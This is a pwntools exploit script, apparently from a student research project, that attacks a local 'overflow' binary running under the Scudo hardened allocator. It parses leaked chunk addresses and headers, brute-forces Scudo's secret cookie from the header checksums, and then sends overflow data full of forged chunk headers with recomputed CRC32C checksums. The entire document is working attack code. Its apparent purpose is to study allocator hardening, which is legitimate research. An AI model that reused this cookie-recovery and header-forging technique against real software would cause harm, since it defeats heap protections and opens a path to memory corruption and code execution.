#!/usr/bin/python3
from pwn import *
from scudocookie import bruteforce, calc_checksum
from crc32c import crc32c

elf = context.binary = ELF("./overflow")

gs = '''
continue
'''

env = {"LD_PRELOAD": "/home/siela1915/BA_Project/libscudo.so"}

if args.NOSCUDO:
    env = {}
elif args.QUARANTINE:
    env["SCUDO_OPTIONS"] = ":".join([
        "thread_local_quarantine_size_kb=5",
        "quarantine_size_kb=10",
        "quarantine_max_chunk_size=2048",
        "release_to_os_interval_ms=-1"
    ])

    
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs, env=env)
    else:
        return process(elf.path, env=env, stdin=PTY)

def getLeak():
    io.recvuntil(b": ")
    address = int(io.recvline(keepends=False), base=16)
    io.recvuntil(b": ")
    header = int(io.recvline(keepends=False))

    checksum = header >> 0x30
    header = header & ((1 << 0x30)-1)

    info(f"Address: {hex(address)} has header: {hex(header)} with checksum: {hex(checksum)}")

    return (address, header, checksum)
    
io = start()


# =============================================================================

addr1, header1, checksum1 = getLeak()

cookie = bruteforce(addr1, checksum1, header1)

addr2, header2, checksum2 = getLeak()

cookie2 = bruteforce(addr2, checksum2, header2)

info(f"Cookie: {hex(cookie)} or {hex(cookie2)}")
info(f"Checksum2: {hex(calc_checksum(addr2, cookie, header2))}")

new_header = 0x8101

chunk_data = b""

for i in range(16):
    new_checksum = calc_checksum(addr1 + 0x20*i, cookie, new_header)

    crc = crc32c(new_header.to_bytes(8, 'little'), crc32c((addr1+0x20*i).to_bytes(8, 'little'), cookie))
    crc = crc ^ (crc >> 0x10)

    info(f"Addr: {hex(addr1 + 0x20*i)} has checksum: {hex(new_checksum)} or checksum {hex(crc)}")
    
    chunk_data += b"a"*16 + new_header.to_bytes(6, 'little') + new_checksum.to_bytes(2, 'little') + b"\0"*8

io.send(chunk_data)
io.send("\n")

# =============================================================================

io.interactive()
